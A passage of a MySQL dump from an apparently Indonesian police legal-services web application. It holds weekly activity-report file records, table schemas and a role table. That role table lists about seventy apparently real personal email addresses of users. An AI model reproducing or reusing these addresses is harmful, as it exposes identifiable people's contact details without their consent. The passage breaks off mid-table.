INSERT INTO `lensa_kegiatan` VALUES (58, 'LAPORAN MINGGU KE-3 JANUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 JANUARI 2021zJAAWxoCi2R1L0bU.pdf', '2021-01-24', NULL, 'Administrator', '2021-01-27 14:39:35', '2021-01-27 14:39:35');
INSERT INTO `lensa_kegiatan` VALUES (59, 'LAPORAN MINGGU KE-4 JANUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 JANUARI 2021ILHaNLO6Xs2qk9Ia.pdf', '2021-01-31', NULL, 'Administrator', '2021-01-31 10:47:40', '2021-01-31 10:47:40');
INSERT INTO `lensa_kegiatan` VALUES (60, 'LAPORAN MINGGU KE-1 FEBRUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 FEBRUARI 2021DadVlOJziE6uPgoS.pdf', '2021-02-07', NULL, 'Administrator', '2021-02-07 08:50:09', '2021-02-07 08:50:09');
INSERT INTO `lensa_kegiatan` VALUES (61, 'LAPORAN MINGGU KE-2 FEBRUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 FEBRUARI 2021ZMiAnk4Fy7PqYEZK.pdf', '2021-02-14', NULL, 'Administrator', '2021-02-14 12:53:01', '2021-02-14 12:53:01');
INSERT INTO `lensa_kegiatan` VALUES (64, 'LAPORAN MINGGU KE-3 FEBRUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 FEBRUARI 2021fhBSfOJmCV3G8J08.pdf', '2021-02-21', NULL, 'Administrator', '2021-03-07 18:00:39', '2021-03-07 18:00:39');
INSERT INTO `lensa_kegiatan` VALUES (65, 'LAPORAN MINGGU KE-4 FEBRUARI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 FEBRUARI 2021zsOLks2wsKlH3z1x.pdf', '2021-02-28', NULL, 'Administrator', '2021-03-07 18:26:23', '2021-03-07 18:26:23');
INSERT INTO `lensa_kegiatan` VALUES (66, 'LAPORAN MINGGU KE-1 MARET 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 MARET 2021ibA6f6RA0dFmfyPi.pdf', '2021-03-07', NULL, 'Administrator', '2021-03-07 18:27:26', '2021-03-07 18:27:26');
INSERT INTO `lensa_kegiatan` VALUES (67, 'LAPORAN MINGGU KE-2 MARET 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 MARET 2021wvfIOkevLhftt9sa.pdf', '2021-03-14', NULL, 'Administrator', '2021-03-15 10:52:59', '2021-03-15 10:52:59');
INSERT INTO `lensa_kegiatan` VALUES (68, 'LAPORAN MINGGU KE-3 MARET 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 MARET 20210EVfqJLrhyqAg6pi.pdf', '2021-03-21', NULL, 'Administrator', '2021-03-23 11:23:13', '2021-03-23 11:23:13');
INSERT INTO `lensa_kegiatan` VALUES (70, 'LAPORAN MINGGU KE-4 MARET 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 MARET 2021ShQ8TdfTUpgCLydR.pdf', '2021-03-28', NULL, 'Administrator', '2021-05-02 17:47:36', '2021-05-02 17:47:36');
INSERT INTO `lensa_kegiatan` VALUES (71, 'LAPORAN MINGGU KE-5 MARET 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-5 MARET 2021bpeXSZcxNgWnsUBn.pdf', '2021-04-04', NULL, 'Administrator', '2021-05-02 17:49:02', '2021-05-02 17:49:02');
INSERT INTO `lensa_kegiatan` VALUES (72, 'LAPORAN MINGGU KE-1 APRIL 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 APRIL 2021KFOTdTHorky51kBJ.pdf', '2021-04-11', NULL, 'Administrator', '2021-05-02 17:49:45', '2021-05-02 17:49:45');
INSERT INTO `lensa_kegiatan` VALUES (73, 'LAPORAN MINGGU KE-2 APRIL 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 APRIL 2021qAHZVLQhOV0q9UCC.pdf', '2021-04-18', NULL, 'Administrator', '2021-05-02 17:50:35', '2021-05-02 17:50:35');
INSERT INTO `lensa_kegiatan` VALUES (75, 'LAPORAN MINGGU KE-1 MEI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 MEI 2021s1sQK9AYmN7hvCKu.pdf', '2021-05-09', NULL, 'Administrator', '2021-05-17 08:31:58', '2021-05-17 08:31:58');
INSERT INTO `lensa_kegiatan` VALUES (76, 'LAPORAN MINGGU KE-2 MEI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 MEI 2021CnRMhIXmW9SMqXVJ.pdf', '2021-05-16', NULL, 'Administrator', '2021-05-17 08:32:35', '2021-05-17 08:32:35');
INSERT INTO `lensa_kegiatan` VALUES (77, 'LAPORAN MINGGU KE-3 APRIL 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 APRIL 2021ssQzeGCM5xDmTA6G.pdf', '2021-05-19', NULL, 'Administrator', '2021-05-19 11:53:50', '2021-05-19 11:53:50');
INSERT INTO `lensa_kegiatan` VALUES (78, 'LAPORAN MINGGU KE-4 APRIL 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 APRIL 2021071v78jVpPFFNxFb.pdf', '2021-05-19', NULL, 'Administrator', '2021-05-19 11:55:14', '2021-05-19 11:55:14');
INSERT INTO `lensa_kegiatan` VALUES (79, 'LAPORAN MINGGU KE-3 MEI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 MEI 2021Zdct5cFLoweXWlZ7.pdf', '2021-05-23', NULL, 'Administrator', '2021-05-25 12:08:50', '2021-05-25 12:08:50');
INSERT INTO `lensa_kegiatan` VALUES (80, 'LAPORAN MINGGU KE-4 MEI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 MEI 20215qsuxuMzfdMxqjla.pdf', '2021-05-30', NULL, 'Administrator', '2021-06-03 20:28:14', '2021-06-03 20:28:14');
INSERT INTO `lensa_kegiatan` VALUES (81, 'LAPORAN MINGGU KE-2 JUNI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JUNI 202175e784JdlKS6edW8.pdf', '2021-06-13', NULL, 'Administrator', '2021-06-13 18:58:41', '2021-06-13 18:58:41');
INSERT INTO `lensa_kegiatan` VALUES (82, 'LAPORAN MINGGU KE-1 JUNI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JUNI 2021XzKHl6JjAIFEny2K.pdf', '2021-06-06', NULL, 'Administrator', '2021-06-27 10:19:28', '2021-06-27 10:19:28');
INSERT INTO `lensa_kegiatan` VALUES (83, 'LAPORAN MINGGU KE-3 JUNI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 JUNI 2021vxlFwkuQ98BSejM6.pdf', '2021-06-20', NULL, 'Administrator', '2021-06-27 10:20:23', '2021-06-27 10:20:23');
INSERT INTO `lensa_kegiatan` VALUES (84, 'LAPORAN MINGGU KE-4 JUNI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 JUNI 2021qwjKgSkop44P3qr1.pdf', '2021-06-27', NULL, 'Administrator', '2021-06-27 10:21:27', '2021-06-27 10:21:27');
INSERT INTO `lensa_kegiatan` VALUES (85, 'LAPORAN MINGGU KE-5 JUNI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-5 JUNI 2021qgUqiRVlbnRLSs4e.pdf', '2021-07-04', NULL, 'Administrator', '2021-07-04 12:12:17', '2021-07-04 12:12:17');
INSERT INTO `lensa_kegiatan` VALUES (86, 'LAPORAN MINGGU KE-1 JULI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JULI 2021UtS9OXX0MmWAZETk.pdf', '2021-07-11', NULL, 'Administrator', '2021-07-18 13:03:58', '2021-07-18 13:03:58');
INSERT INTO `lensa_kegiatan` VALUES (87, 'LAPORAN MINGGU KE-2 JULI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 JULI 20217wAlV7tbsrw1XukY.pdf', '2021-07-18', NULL, 'Administrator', '2021-07-18 13:04:52', '2021-07-18 13:04:52');
INSERT INTO `lensa_kegiatan` VALUES (88, 'LAPORAN MINGGU KE-4 JULI 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 JULI 2021Gb43lq1OvhsCHZnP.pdf', '2021-08-01', NULL, 'Administrator', '2021-08-02 09:51:56', '2021-08-02 09:51:56');
INSERT INTO `lensa_kegiatan` VALUES (89, 'LAPORAN MINGGU KE-1 AGUSTUS 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 AGUSTUS 20211CMQ7CJm8iS9X23U.pdf', '2021-08-08', NULL, 'Administrator', '2021-08-08 11:00:21', '2021-08-08 11:00:21');
INSERT INTO `lensa_kegiatan` VALUES (91, 'LAPORAN MINGGU KE-2 AGUSTUS 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 AGUSTUS 2021tLLcjupqr6Tg537J.pdf', '2021-08-15', NULL, 'Administrator', '2021-08-15 17:37:53', '2021-08-15 17:37:53');
INSERT INTO `lensa_kegiatan` VALUES (92, 'LAPORAN MINGGU KE-3 AGUSTUS 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 AGUSTUS 20212XlKbaevFY7TV2uU.pdf', '2021-08-22', NULL, 'Administrator', '2021-08-22 13:37:37', '2021-08-22 13:37:37');
INSERT INTO `lensa_kegiatan` VALUES (93, 'LAPORAN MINGGU KE-4 AGUSTUS 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 AGUSTUS 2021vwskKSEUGYhmeDdT.pdf', '2021-08-29', NULL, 'Administrator', '2021-08-29 21:47:56', '2021-08-29 21:47:56');
INSERT INTO `lensa_kegiatan` VALUES (94, 'LAPORAN MINGGU KE-1 SEPTEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 SEPTEMBER 2021eRpSksSj34kgpM5U.pdf', '2021-09-05', NULL, 'Administrator', '2021-09-05 11:32:21', '2021-09-05 11:32:21');
INSERT INTO `lensa_kegiatan` VALUES (95, 'LAPORAN MINGGU KE-2 SEPTEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 SEPTEMBER 2021t7kuS2hHunvi1Hmf.pdf', '2021-09-12', NULL, 'Administrator', '2021-09-12 11:53:22', '2021-09-12 11:53:22');
INSERT INTO `lensa_kegiatan` VALUES (96, 'LAPORAN MINGGU KE-3 SEPTEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 SEPTEMBER 2021RatIEN3jYPVIVTj8.pdf', '2021-09-19', NULL, 'Administrator', '2021-09-19 12:28:36', '2021-09-19 12:28:36');
INSERT INTO `lensa_kegiatan` VALUES (97, 'LAPORAN MINGGU KE-4 SEPTEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 SEPTEMBER 20210n5DurDuFjvuoIcJ.pdf', '2021-09-26', NULL, 'Administrator', '2021-09-26 19:56:28', '2021-09-26 19:56:28');
INSERT INTO `lensa_kegiatan` VALUES (98, 'LAPORAN MINGGU KE-1 OKTOBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 OKTOBER 2021W53TS1nV5z585VFp.pdf', '2021-10-10', NULL, 'Administrator', '2021-10-24 18:07:50', '2021-10-24 18:07:50');
INSERT INTO `lensa_kegiatan` VALUES (99, 'LAPORAN MINGGU KE-2 OKTOBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 OKTOBER 20214ZeGToxOmcjLppBW.pdf', '2021-10-17', NULL, 'Administrator', '2021-10-24 18:08:50', '2021-10-24 18:08:50');
INSERT INTO `lensa_kegiatan` VALUES (100, 'LAPORAN MINGGU KE-3 OKTOBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 OKTOBER 2021SOhGMc5bPztiaSaM.pdf', '2021-10-24', NULL, 'Administrator', '2021-10-24 18:09:40', '2021-10-24 18:09:40');
INSERT INTO `lensa_kegiatan` VALUES (101, 'LAPORAN MINGGU KE-4 OKTOBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 OKTOBER 2021khx5wriYGsA69YkO.pdf', '2021-10-31', NULL, 'Administrator', '2021-10-31 21:57:23', '2021-10-31 21:57:23');
INSERT INTO `lensa_kegiatan` VALUES (102, 'LAPORAN MINGGU KE-1 NOVEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 NOVEMBER 2021lfEomsmZnRsnZySu.pdf', '2021-11-07', NULL, 'Administrator', '2021-11-07 10:50:11', '2021-11-07 10:50:11');
INSERT INTO `lensa_kegiatan` VALUES (103, 'LAPORAN MINGGU KE-2 NOVEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-2 NOVEMBER 2021w2V4pgLapRXklIrm.pdf', '2021-11-14', NULL, 'Administrator', '2021-11-14 12:12:08', '2021-11-14 12:12:08');
INSERT INTO `lensa_kegiatan` VALUES (104, 'LAPORAN MINGGU KE-3 NOVEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 NOVEMBER 2021QF7BUkalYQuoq4ZW.pdf', '2021-11-21', NULL, 'Administrator', '2021-11-21 12:13:21', '2021-11-21 12:13:21');
INSERT INTO `lensa_kegiatan` VALUES (105, 'LAPORAN MINGGU KE-4 NOVEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 NOVEMBER 2021YcrSQsCagJrbFo5p.pdf', '2021-11-28', NULL, 'Administrator', '2021-11-28 11:47:57', '2021-11-28 11:47:57');
INSERT INTO `lensa_kegiatan` VALUES (106, 'LAPORAN MINGGU KE-1 DESEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 DESEMBER 2021pFnYkzyIyZ3CIaqS.pdf', '2021-12-05', NULL, 'Administrator', '2021-12-05 13:23:50', '2021-12-05 13:23:50');
INSERT INTO `lensa_kegiatan` VALUES (109, 'LAPORAN MINGGU KE-5 DESEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-5 DESEMBER 2021eNqg9mNC9JJCGGQ6.pdf', '2022-01-02', NULL, 'Administrator', '2022-01-02 12:39:56', '2022-01-02 12:39:56');
INSERT INTO `lensa_kegiatan` VALUES (110, 'LAPORAN MINGGU KE-4 DESEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-4 DESEMBER 2021SR6VE4BbkTgr10L0.pdf', '2021-12-26', NULL, 'Administrator', '2022-01-02 12:41:02', '2022-01-02 12:41:02');
INSERT INTO `lensa_kegiatan` VALUES (111, 'LAPORAN MINGGU KE-3 DESEMBER 2021', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-3 DESEMBER 2021OkerClOLeghINgG4.pdf', '2021-12-19', NULL, 'Administrator', '2022-01-02 12:42:14', '2022-01-02 12:42:14');
INSERT INTO `lensa_kegiatan` VALUES (112, 'LAPORAN MINGGU KE-1 JANUARI 2022', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JANUARI 2022RleOikKaFUx5PawM.pdf', '2022-01-09', NULL, 'Administrator', '2022-01-09 17:15:10', '2022-01-09 17:15:10');
INSERT INTO `lensa_kegiatan` VALUES (113, 'LAPORAN MINGGU KE-1 JANUARI 2022', 'public/upload/lensakegiatan/LAPORAN MINGGU KE-1 JANUARI 2022veJpKS3fxuw5XTKj.pdf', '2022-01-14', NULL, 'Administrator', '2022-01-14 11:04:25', '2022-01-14 11:04:25');

-- ----------------------------
-- Table structure for litcatkum
-- ----------------------------
DROP TABLE IF EXISTS `litcatkum`;
CREATE TABLE `litcatkum`  (
  `litcatkum_id` bigint NOT NULL AUTO_INCREMENT,
  `litcatkum_nama` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_pangkat` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_nrp` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_jabatan` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_satuan_kerja` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_nomor_lp` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_tahun_lp` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_jenis_pelanggaran` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_nomor_psh` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_nomor_skhd` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_hukuman` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_nomor_prs` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `litcatkum_hasil` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `operator` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`litcatkum_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of litcatkum
-- ----------------------------
INSERT INTO `litcatkum` VALUES (1, 'Nama', 'Pangkat', 'No. NRP', 'Jabatan', 'Polda', 'No. LP', 'Tahun LP', 'Jenis Pelanggaran', 'No. PSH', 'No. SKHD', 'Hukuman', 'No. PRS', 'Hasil', 'Administrator', '2022-07-07 19:18:26', '2022-07-07 19:18:26');

-- ----------------------------
-- Table structure for member
-- ----------------------------
DROP TABLE IF EXISTS `member`;
CREATE TABLE `member`  (
  `member_id` bigint NOT NULL AUTO_INCREMENT,
  `member_nama` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `member_email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`member_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of member
-- ----------------------------

-- ----------------------------
-- Table structure for messages
-- ----------------------------
DROP TABLE IF EXISTS `messages`;
CREATE TABLE `messages`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `from` bigint NULL DEFAULT NULL,
  `to` bigint NULL DEFAULT NULL,
  `message` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `is_read` tinyint NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of messages
-- ----------------------------

-- ----------------------------
-- Table structure for migrations
-- ----------------------------
DROP TABLE IF EXISTS `migrations`;
CREATE TABLE `migrations`  (
  `id` int UNSIGNED NOT NULL,
  `migration` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of migrations
-- ----------------------------
INSERT INTO `migrations` VALUES (211, '2014_10_12_000000_create_pengguna_table', 1);
INSERT INTO `migrations` VALUES (212, '2019_12_28_205125_create_chat_table', 1);
INSERT INTO `migrations` VALUES (213, '2019_12_28_205147_create_bantuan_hukum_table', 1);
INSERT INTO `migrations` VALUES (214, '2019_12_28_205204_create_pendapat_saran_table', 1);
INSERT INTO `migrations` VALUES (215, '2019_12_28_205225_create_lensa_kegiatan_table', 1);
INSERT INTO `migrations` VALUES (216, '2019_12_28_215458_create_peraturan_table', 1);
INSERT INTO `migrations` VALUES (217, '2019_12_29_023315_create_permission_tables', 1);
INSERT INTO `migrations` VALUES (218, '2014_10_12_000000_create_users_table', 2);
INSERT INTO `migrations` VALUES (219, '2014_10_12_100000_create_password_resets_table', 2);
INSERT INTO `migrations` VALUES (220, '2019_09_01_091245_create_messages_table', 2);

-- ----------------------------
-- Table structure for model_has_permissions
-- ----------------------------
DROP TABLE IF EXISTS `model_has_permissions`;
CREATE TABLE `model_has_permissions`  (
  `permission_id` bigint UNSIGNED NOT NULL,
  `model_type` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `model_id` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`permission_id`, `model_id`, `model_type`) USING BTREE,
  INDEX `model_has_permissions_model_id_model_type_index`(`model_id`, `model_type`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of model_has_permissions
-- ----------------------------

-- ----------------------------
-- Table structure for model_has_roles
-- ----------------------------
DROP TABLE IF EXISTS `model_has_roles`;
CREATE TABLE `model_has_roles`  (
  `role_id` bigint UNSIGNED NOT NULL,
  `model_type` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `model_id` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of model_has_roles
-- ----------------------------
INSERT INTO `model_has_roles` VALUES (1, 'App\\Pengguna', 'admin');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'agusismail432@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'ahmadamin3012@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'amiruddin1916@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'andifajar@mail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'aruldien09@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'bapaksamudra04@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'bimasaidin7@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'deddijintor@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'firmansyahferdi84@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'harisolo79@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'hehendrawansupriadi38@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'hendrawannn97@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'hendrisatriawan4238@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'imamtriyanasaputra@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'jaelaniahmad82032@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'jalila2474@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'johanyuga@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'joniiskandar@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'Julpamungkass6@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'lalunabiel9723@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'laluyanto32@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'mahpoezolet@gmal.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'musamataram@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'naufalvata@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'rudi.tatang@yahoo.co.id');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'rudykrisno5@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'rumaraeirwan@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'sabhara87071419@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'sinurat160980@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'sudarmininggid@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'sugyantoanton00544@agmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'syahmuddin82.ut@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'syamsuldtn39@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'tialestari500@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'tohriadi081@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'umarduaempat@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'yudhywan24@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'yudivk@rocketmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'joni@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'alitayu8701@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'shsuprianto03@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'zulheldisasak36@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'ayradirgantara@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'lalatama33@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'khaerullalu@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'erlans221@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'iizzat282@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'winarnowinarno395@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'kanakjonggat@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'indahdamai67@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'abuaqilsuhardi468@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'indrajentol@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'laluahlan@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'hartenmuammarqadafi@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'yudabigland@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'herison_ramdhoni@yahoo.co.id');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'dinalay69@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'agus.susanto.as817@Gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'Sangnyomanardika@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'lungguhh@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'misnan17.suryadi@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'sheilaalleandradevian@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'saepulpermana851@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'ajiqde79@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'papasina3286@gmail.com');
INSERT INTO `model_has_roles` VALUES (3, 'App\\Pengguna', 'fandisakra303@dodcom');

-- ----------------------------
-- Table structure for password_resets
-- ----------------------------
DROP TABLE IF EXISTS `password_resets`;
CREATE TABLE `password_resets`  (
  `email` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `token` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of password_resets
-- ----------------------------

-- ----------------------------
-- Table structure for pendapat_saran
-- ----------------------------
DROP TABLE IF EXISTS `pendapat_saran`;
CREATE TABLE `pendapat_saran`  (
  `pendapat_saran_id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
